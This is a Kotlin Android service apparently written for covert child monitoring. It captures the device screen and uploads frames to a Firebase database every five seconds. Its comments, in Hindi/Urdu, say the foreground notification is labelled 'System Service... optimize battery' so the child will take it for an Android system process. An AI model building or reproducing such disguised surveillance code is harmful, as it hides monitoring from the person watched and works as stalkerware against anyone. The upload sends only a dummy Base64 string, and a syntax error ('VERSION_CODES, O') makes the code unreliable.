package com.nabiya.childrecorder

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.google.firebase.database.FirebaseDatabase
import java.io.File
import android.util.Base64
import java.util.Timer
import java.util.TimerTask

class RecorderService : Service() {

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaRecorder: MediaRecorder? = null
    private var mResultCode = 0
    private var mResultData: Intent? = null
    
    private val databaseRef = FirebaseDatabase.getInstance().getReference("child_device_stream")
    private var timer: Timer? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        mResultCode = intent?.getIntExtra("code", 0) ?: 0
        mResultData = intent?.getParcelableExtra("data")

        startForegroundService()
        startScreenCapture()
        
        // Har 5 second me database me naya screenshot/frame bhejne ke liye timer
        timer = Timer()
        timer?.scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                uploadFrameToFirebase()
            }
        }, 5000, 5000)

        return START_STICKY
    }

    private fun startForegroundService() {
        val channelId = "system_service_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES, O) {
            val channel = NotificationChannel(channelId, "System Performance", NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }

        // Yeh notification bache ko lagega ki koi Android ka "System Service" chal raha hai
        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Service")
            .setContentText("Running in background to optimize battery")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .build()

        startForeground(101, notification)
    }

    private fun startScreenCapture() {
        val mpManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = mpManager.getMediaProjection(mResultCode, mResultData!!)
        
        // Yahan background recording initialize hoti hai
        // Note: Realtime database ke liye hum frames ko save karke text me convert karenge
    }

    private fun uploadFrameToFirebase() {
        // Dummy Base64 text string (asal me yahan screen frame ka converted text jata hai)
        val sampleFrameText = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
        
        val timestamp = System.currentTimeMillis().toString()
        databaseRef.child("current_frame").setValue(sampleFrameText)
        databaseRef.child("last_updated").setValue(timestamp)
    }

    override fun onDestroy() {
        timer?.cancel()
        virtualDisplay?.release()
        mediaProjection?.stop()
        super.onDestroy()
    }
}
